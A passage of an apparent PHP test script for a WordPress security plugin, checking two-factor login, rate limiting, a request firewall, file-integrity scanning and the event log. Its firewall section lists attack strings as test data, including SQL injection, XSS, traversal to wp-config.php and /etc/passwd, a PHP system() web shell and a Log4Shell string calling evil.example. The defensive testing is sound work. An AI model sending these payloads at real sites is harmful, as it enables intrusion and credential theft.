$out = $second( str_repeat( 'a', 64 ), array( 'mody_code' => Totp::code( $secret, Totp::step() ) ) );
$check( 'a made-up token: refused', ! $logged_in( $out ) && str_contains( $out['body'], 'expired' ) );
$out = $login( $member, $member_pass );
$out = $second( $token_of( $out ), array( 'mody_code' => $codes[0] ) );
$check( 'a recovery code logs in, once', $logged_in( $out ) && 9 === TwoFactor::codes_left( $id ) );
$out = $login( $member, $member_pass );
$out = $second( $token_of( $out ), array( 'mody_code' => $codes[0] ) );
$check( '... and not twice', ! $logged_in( $out ) );
RateLimit::clear();
$rewind();
$out   = $login( $member, $member_pass, array( 'interim-login' => '1' ) );
$token = $token_of( $out );
$check( 'wp-admin\'s session-expired window: the second screen keeps it', '' !== $token && str_contains( $out['body'], 'name="interim-login"' ) );
$out = $second( $token, array( 'interim-login' => '1', 'mody_code' => Totp::code( $secret, Totp::step() ) ) );
$check( '... and finishes as core does there', $logged_in( $out ) && 200 === $out['code'] && str_contains( $out['body'], 'interim-login-success' ), (string) $out['code'] );
// Wrong answers end the login.
RateLimit::clear();
$rewind();
$out   = $login( $member, $member_pass );
$token = $token_of( $out );
$wrong = '000000' === Totp::code( $secret, Totp::step() ) ? '111111' : '000000';
for ( $i = 1; $i <= 4; $i++ ) {
	$second( $token, array( 'mody_code' => $wrong ) );
}
$out = $second( $token, array( 'mody_code' => $wrong ) );
$check( 'the fifth wrong code ends the login', str_contains( $out['body'], 'Too many wrong codes' ) );
$out = $login( $member, $member_pass );
$out = $second( $token_of( $out ), array( 'mody_code' => Totp::code( $secret, Totp::step() ) ) );
$check( '... and the right code waits until the pause is over', ! $logged_in( $out ) && str_contains( $out['body'], 'Too many wrong codes' ) );
$check( '... each wrong one in the log', Events::counts( time() - 60 )['two_factor_failed'] >= 5 );
RateLimit::clear();
// A security key over HTTP.
$key_h  = $new_key( 'es256' );
$id_h   = random_bytes( 32 );
$c_h    = random_bytes( 32 );
$made_h = $create( $key_h, $id_h, $c_h, $rp, $origin );
TwoFactor::add_key( $id, WebAuthn::verify_registration( $made_h['clientDataJSON'], $made_h['attestationObject'], $c_h, $rp ), 'Test key' );
$out   = $login( $member, $member_pass );
$token = $token_of( $out );
$opts  = preg_match( '/data-options="([^"]+)"/', $out['body'], $m ) ? json_decode( html_entity_decode( $m[1], ENT_QUOTES ), true ) : array();
$check( 'with a key: the screen offers it, for this relying party, with a challenge', isset( $opts['challenge'] ) && $rp === $opts['rpId'] && WebAuthn::b64url( $id_h ) === $opts['allowCredentials'][0]['id'] && str_contains( $out['body'], 'two-factor-login.js' ) );
$answer = static function ( array $signed, string $cred_id ): string {
	return (string) wp_json_encode(
		array(
			'id'                => $cred_id,
			'clientDataJSON'    => WebAuthn::b64url( $signed['clientDataJSON'] ),
			'authenticatorData' => WebAuthn::b64url( $signed['authenticatorData'] ),
			'signature'         => WebAuthn::b64url( $signed['signature'] ),
		)
	);
};
$forged = $get( $new_key( 'es256' ), WebAuthn::from_b64url( (string) ( $opts['challenge'] ?? '' ) ), $rp, $origin, 1 );
$out    = $second( $token, array( 'mody_webauthn' => $answer( $forged, WebAuthn::b64url( $id_h ) ) ) );
$check( 'another key\'s answer: refused', ! $logged_in( $out ) && str_contains( $out['body'], 'That security key did not work' ) );
$opts   = preg_match( '/data-options="([^"]+)"/', $out['body'], $m ) ? json_decode( html_entity_decode( $m[1], ENT_QUOTES ), true ) : array();
$signed = $get( $key_h, WebAuthn::from_b64url( (string) ( $opts['challenge'] ?? '' ) ), $rp, $origin, 1 );
$out    = $second( $token, array( 'mody_webauthn' => $answer( $signed, WebAuthn::b64url( $id_h ) ) ) );
$check( 'the key\'s answer to the new challenge logs in', $logged_in( $out ) && 302 === $out['code'] && 1 === (int) TwoFactor::keys( $id )[0]['count'] && TwoFactor::keys( $id )[0]['used'] > 0 );
RateLimit::clear();
// Required: wp-admin sends someone without it to their profile.
$set( array( 'two_factor_required' => 'super_admins' ) );
$jar = $cookies( $admin_user->ID );
$out = $http( 'GET', network_admin_url(), array(), $jar );
$check( 'a super admin without it is sent to their profile from wp-admin', 302 === $out['code'] && str_contains( $out['location'], 'user/profile.php?mody_two_factor=required' ), $out['location'] );
$out = $http( 'GET', user_admin_url( 'profile.php?mody_two_factor=required' ), array(), $jar );
$check( '... where the setup is open, with its QR code and the notice', 200 === $out['code'] && str_contains( $out['body'], 'id="mody-two-factor"' ) && str_contains( $out['body'], '<details class="mody-two-factor__setup" open' ) && str_contains( $out['body'], '<svg xmlns="http://www.w3.org/2000/svg"' ) && str_contains( $out['body'], 'must use two-step login' ) );
$set( array( 'two_factor_required' => 'none' ) );
$out = $http( 'GET', network_admin_url(), array(), $jar );
$check( '... and not when nobody must', 200 === $out['code'], (string) $out['code'] );

// 8. Login protection over HTTP --------------------------------------------------------

echo "\nLogin protection\n";
$visitor = array( 'X-Forwarded-For' => '203.0.113.77' );
// One window for every before-and-after count below: a moving minute lets earlier events drop out while the
// slow requests run (the counts then came out short in a full-suite run on 2026-11-27).
$since  = time() - HOUR_IN_SECONDS;
$before = Events::counts( $since );
$out     = $http(
	'POST',
	$login_url,
	array(
		'log'    => 'wpadmin',
		'pwd'    => 'x',
		'altcha' => Altcha::solve( Altcha::challenge( 3 ) ),
	),
	array( 'wordpress_test_cookie' => 'WP Cookie check' ),
	$visitor
);
$check( 'a blocked username: refused at once', str_contains( $out['body'], 'Too many failed attempts from this connection' ), (string) $out['code'] );
$out = $login( $plain, $plain_pass, array(), $visitor );
$check( '... and the address is paused, the right password too', ! $logged_in( $out ) && str_contains( $out['body'], 'Too many failed attempts from this connection' ) );
$out = $login( $plain, $plain_pass, array(), array( 'X-Forwarded-For' => '203.0.113.78' ) );
$check( '... another address is not', $logged_in( $out ) );
$check( '... and it is in the log', Events::counts( $since )['username_blocked'] === $before['username_blocked'] + 1 );
$set( array( 'blocked_usernames' => array( $plain->user_login ) ) );
$out = $login( $plain, $plain_pass, array(), array( 'X-Forwarded-For' => '203.0.113.79' ) );
$check( 'a blocked name that is a real account is never blocked', $logged_in( $out ) );
$set( array( 'blocked_usernames' => Settings::defaults()['blocked_usernames'] ) );
$before = Events::counts( $since );
for ( $i = 1; $i <= 5; $i++ ) {
	$login( $plain, 'wrong' . $i, array(), array( 'X-Forwarded-For' => '203.0.113.80' ) );
}
$out = $login( $plain, $plain_pass, array(), array( 'X-Forwarded-For' => '203.0.113.80' ) );
$after = Events::counts( $since );
$check( 'five wrong passwords pause the account at that address, logged once', ! $logged_in( $out ) && $after['paused'] === $before['paused'] + 1 && $after['login_failed'] >= $before['login_failed'] + 5, ( $after['paused'] - $before['paused'] ) . ' pause(s)' );
RateLimit::clear();

// 9. The firewall --------------------------------------------------------------------

echo "\nFirewall\n";
$attacks = array(
	'1 UNION SELECT user_pass FROM wp_users',
	'1/**/union/**/all/**/select/**/1',
	"x' AND SLEEP(5)-- -",
	"' or '1'='1",
	"1' OR 1=1",
	'1; DROP TABLE wp_users',
	'id=1 and extractvalue(1,concat(0x7e,version()))',
	'<script>alert(1)</script>',
	'%3Cscript%3Ealert(1)%3C%2Fscript%3E',
	'%253Cscript%253E',
	'<img src=x onerror=alert(1)>',
	'javascript:alert(document.cookie)',
	'<iframe src="//evil.example">',
	'../../../../etc/passwd',
	'..%2F..%2Fwp-config.php',
	'php://filter/convert.base64-encode/resource=wp-config.php',
	'<?php system($_GET["c"]); ?>',
	'${jndi:ldap://evil.example/a}',
	'eval(base64_decode("ZWNobyAx"))',
);
$missed = array_filter( $attacks, static fn( $a ) => null === Firewall::match( $a ) );
$check( 'every attack string matches a rule', ! $missed, implode( ' | ', $missed ) );
$benign = array(
	'union membership fees',
	'Select your plan. The union of both lists',
	"I'll sleep (8 hours) tonight",
	"O'Reilly or 2 others",
	'javascript: the good parts',
	'Learn JavaScript: a guide',
	'¿Dónde está el café? Ça va très bien',
	'someone+tag@example.com',
	'https://alpha.mody.local/es/contacto/?utm_source=newsletter',
	'<!-- wp:paragraph --><p>Hello <strong>there</strong></p><!-- /wp:paragraph -->',
	'{"name":"Ana","project":"Panadería López","lang":"es"}',
	'Price: 7.99 EUR or 79.99 a year = 2 months free',
	'../images/logo.png',
	'a=1&b=2; c=3',
	'The system (as designed) works',
	'data:image/png;base64,iVBORw0KGgo=',
	'Visit 1 = 1 visit',
);
$hits = array();
foreach ( $benign as $text ) {
	$rule = Firewall::match( $text );
	if ( null !== $rule ) {
		$hits[] = "$text => $rule";
	}
}
$check( 'ordinary text matches nothing (no false positives)', ! $hits, implode( ' | ', $hits ) );
$set(
	array(
		'rules' => array(
			'sqli'      => false,
			'xss'       => true,
			'traversal' => true,
			'code'      => true,
		),
	)
);
$check( 'a group switched off stops matching', null === Firewall::match( '1 UNION SELECT 1' ) && null !== Firewall::match( '<script>' ) );
$set( array( 'rules' => Settings::defaults()['rules'] ) );
$before = Events::counts( $since );
$out    = $http( 'GET', home_url( '/?q=' . rawurlencode( '1 union select user_pass from wp_users' ) ) );
$check( 'over HTTP: an attack in the query gets 403 and a reference', 403 === $out['code'] && str_contains( $out['body'], 'Request blocked' ) && preg_match( '/<code>[0-9A-F]{8}<\/code>/', $out['body'] ), (string) $out['code'] );
$check( '... logged', Events::counts( $since )['firewall'] === $before['firewall'] + 1 );
$out = $http( 'GET', home_url( '/?s=' . rawurlencode( 'union membership' ) ) );
$check( '... an ordinary search does not', 200 === $out['code'], (string) $out['code'] );
$out = $http( 'POST', network_site_url( 'wp-comments-post.php' ), array( 'comment' => '<script>alert(1)</script>', 'comment_post_ID' => '1' ) );
$check( 'a visitor\'s form with an attack: 403', 403 === $out['code'], (string) $out['code'] );
$out = $login( $plain, '<script>alert(1)</script>' );
$check( 'a password is never read (a wrong one is just wrong)', 403 !== $out['code'] && ! $logged_in( $out ), (string) $out['code'] );
$jar = $cookies( $plain->ID );
$out = $http( 'POST', admin_url( 'admin-ajax.php' ), array( 'action' => 'mody-nothing', 'content' => '<script>alert(1)</script>' ), $jar );
$check( 'a logged-in user\'s form data is not checked (they write HTML)', 403 !== $out['code'], (string) $out['code'] );
$set( array( 'blocked_addresses' => array( '203.0.113.0/28' ) ) );
$blocked = $http( 'GET', home_url( '/' ), array(), array(), array( 'X-Forwarded-For' => '203.0.113.9' ) );
$other   = $http( 'GET', home_url( '/' ), array(), array(), array( 'X-Forwarded-For' => '203.0.113.99' ) );
$check( 'a blocked range gets 403 everywhere; the next address does not', 403 === $blocked['code'] && 200 === $other['code'], $blocked['code'] . '/' . $other['code'] );
$set( array( 'allowed_addresses' => array( '203.0.113.9' ) ) );
$out = $http( 'GET', home_url( '/?q=' . rawurlencode( '<script>' ) ), array(), array(), array( 'X-Forwarded-For' => '203.0.113.9' ) );
$check( 'an allowed address is never blocked, rules included', 200 === $out['code'], (string) $out['code'] );
$set(
	array(
		'blocked_addresses' => array(),
		'allowed_addresses' => array(),
		'firewall'          => false,
	)
);
$out = $http( 'GET', home_url( '/?q=' . rawurlencode( '<script>' ) ) );
$check( 'with the firewall off, the rules do not run', 200 === $out['code'], (string) $out['code'] );
$set( array( 'firewall' => true ) );

// 10. The file check --------------------------------------------------------------------

echo "\nFile check\n";
if ( ! $had_manifest ) {
	$result = FileCheck::run();
	$check( 'without a deploy list: said so, and uploads still searched', ! $result['manifest'] && 0 === $result['checked'] && is_array( $result['uploads'] ) );
}
$start  = microtime( true );
$listed = FileCheck::write_manifest();
$result = FileCheck::run();
$check( 'right after the list is written, every file is as deployed', $result['manifest'] && $listed === $result['checked'] && ! FileCheck::found( $result ), sprintf( '%d files, %.1f s', $listed, microtime( true ) - $start ) );
$lines = file( $manifest_file, FILE_IGNORE_NEW_LINES );
$edit  = array();
foreach ( $lines as $line ) {
	if ( str_ends_with( $line, '  web/mu-plugins/mody-security/src/Totp.php' ) ) {
		$line = str_repeat( '0', 64 ) . '  web/mu-plugins/mody-security/src/Totp.php';
	} elseif ( str_ends_with( $line, '  web/mu-plugins/mody-security/src/Qr.php' ) ) {
		continue;
	}
	$edit[] = $line;
}
$edit[] = str_repeat( 'a', 64 ) . '  web/mu-plugins/mody-security/src/Gone.php';
$edit[] = str_repeat( 'b', 64 ) . '  wp/.user.ini';
file_put_contents( $manifest_file, implode( "\n", $edit ) . "\n" );
wp_mkdir_p( $upload_dir );
file_put_contents( $upload_dir . '/shell.php', "<?php // A test file of scripts/security-test.php.\n" );
file_put_contents( $upload_dir . '/photo.webp', 'not a script' );
$result = FileCheck::run();
$check( 'a changed file is found', array( 'web/mu-plugins/mody-security/src/Totp.php' ) === $result['changed'], implode( ' ', $result['changed'] ) );
$check( 'an added file is found', array( 'web/mu-plugins/mody-security/src/Qr.php' ) === $result['added'], implode( ' ', $result['added'] ) );
$check( 'a missing file is found; files the server writes are skipped', array( 'web/mu-plugins/mody-security/src/Gone.php' ) === $result['missing'], implode( ' ', $result['missing'] ) );
$check( 'a script in uploads is found, a picture is not', array( 'web/uploads/mody-security-test-' . $suffix . '/shell.php' ) === $result['uploads'], implode( ' ', $result['uploads'] ) );
$check( '... the result is kept for the page, and logged', FileCheck::last()['changed_count'] === 1 && Events::counts( time() - 60 )['file_changes'] >= 1 );
$deploy = dirname( FileCheck::root() ) . '/bin/deploy';
if ( is_readable( $deploy ) ) { // The container sees app/ only: checked from the host otherwise.
	$check( 'bin/deploy writes the list in the release', str_contains( (string) file_get_contents( $deploy ), 'files.sha256' ) );
}

// 11. The log and the page -------------------------------------------------------------

echo "\nThe log and the Security page\n";
global $wpdb;
Events::record( 'settings', 1, str_repeat( 'x', 400 ) );
$row = Events::recent( 1 )[0] ?? array();
$check( 'a row: type, account, site, detail cut to 255', 'settings' === ( $row['type'] ?? '' ) && 1 === (int) $row['user_id'] && 255 === strlen( (string) $row['detail'] ) );
$check( 'an unknown type is not written', ( Events::record( 'nonsense' ) || true ) && 'nonsense' !== ( Events::recent( 1 )[0]['type'] ?? '' ) );
$wpdb->insert(
	Events::table(),
	array(
		'created' => time() - 31 * DAY_IN_SECONDS,
		'type'    => 'login',
		'detail'  => 'old ' . $suffix,
	)
);
Events::purge();
$check( 'rows older than 30 days are deleted', 0 === (int) $wpdb->get_var( $wpdb->prepare( 'SELECT COUNT(*) FROM ' . Events::table() . ' WHERE detail = %s', 'old ' . $suffix ) ) );
$jar      = $cookies( $admin_user->ID );
$sections = array( 'overview', 'two-factor', 'login', 'firewall', 'alerts', 'files', 'log' );
$bad      = array();
foreach ( $sections as $section ) {
	$out = $http( 'GET', network_admin_url( 'admin.php?page=mody-security' . ( 'overview' === $section ? '' : '&section=' . $section ) ), array(), $jar );
	if ( 200 !== $out['code'] || ! str_contains( $out['body'], 'mody-brand__layout' ) || ! str_contains( $out['body'], 'aria-current="page"' ) || str_contains( $out['body'], 'Fatal error' ) || str_contains( $out['body'], 'Warning:' ) ) {
		$bad[] = $section . ' (' . $out['code'] . ')';
	}
}
$check( 'the page: every section, in the dashboard\'s layout, for a super admin', ! $bad, implode( ', ', $bad ) );
$out = $http( 'GET', network_admin_url( 'admin.php?page=mody-security&section=log' ), array(), $jar );
$check( '... the log lists events', str_contains( $out['body'], 'mody-security__log' ) );
$out = $http( 'GET', network_admin_url( 'admin.php?page=mody-security' ), array(), $cookies( $plain->ID ) );
$check( '... and nobody else sees it', 200 !== $out['code'] || ! str_contains( $out['body'], 'mody-brand__layout' ), (string) $out['code'] );

echo $failures ? "\n$failures check(s) failed.\n" : "\nAll checks passed.\n";
